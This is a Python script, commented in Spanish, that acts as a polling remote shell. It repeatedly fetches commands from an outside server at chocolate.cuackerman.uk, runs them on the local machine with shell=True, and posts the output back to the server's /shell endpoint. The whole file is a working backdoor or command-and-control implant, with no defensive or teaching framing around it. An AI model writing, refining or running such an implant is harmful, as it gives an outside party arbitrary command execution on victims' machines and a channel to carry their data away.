import requests
import time
import subprocess
import signal
import os

# Configuración
BASE_URL = "http://chocolate.cuackerman.uk"
ultimo_comando = ""
TIMEOUT_COMANDO = 5  # Timeout para comandos (ping, etc)
POLLING_INTERVAL = 0.5  # Intervalo de polling más rápido

def ejecutar_comando(comando):
    """Ejecuta comando con timeout"""
    try:
        # Crear proceso
        proceso = subprocess.Popen(
            comando,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid if os.name == 'posix' else None
        )
        
        # Esperar con timeout
        try:
            stdout, stderr = proceso.communicate(timeout=TIMEOUT_COMANDO)
            salida = stdout if stdout else stderr
            return salida if salida else "Comando ejecutado sin salida"
        except subprocess.TimeoutExpired:
            # Matar proceso y todos sus hijos
            if os.name == 'posix':
                os.killpg(os.getpgid(proceso.pid), signal.SIGTERM)
            else:
                proceso.kill()
            proceso.communicate()
            return f"Comando terminado por timeout ({TIMEOUT_COMANDO}s)"
            
    except Exception as e:
        return f"Error: {e}"

while True:
    try:
        # Obtener comando
        response = requests.get(f'{BASE_URL}/messages', timeout=2)
        
        if response.status_code == 200:
            comando = response.text.strip()
            
            if comando and comando != ultimo_comando:
                print(f"\n[*] Ejecutando: {comando}")
                
                # Ejecutar comando
                salida = ejecutar_comando(comando)
                
                if salida:
                    print(f"[+] Salida: {salida[:200]}..." if len(salida) > 200 else f"[+] Salida: {salida}")
                    
                    # Enviar resultado
                    try:
                        requests.post(f'{BASE_URL}/shell', data=salida, timeout=3)
                        print("[✓] Salida enviada")
                    except Exception as e:
                        print(f"[!] Error al enviar salida: {e}")
                
                ultimo_comando = comando
                
    except requests.exceptions.Timeout:
        pass  # Silencioso para timeout
    except Exception as e:
        print(f"[!] Error: {e}")
        time.sleep(2)
    
    time.sleep(POLLING_INTERVAL)
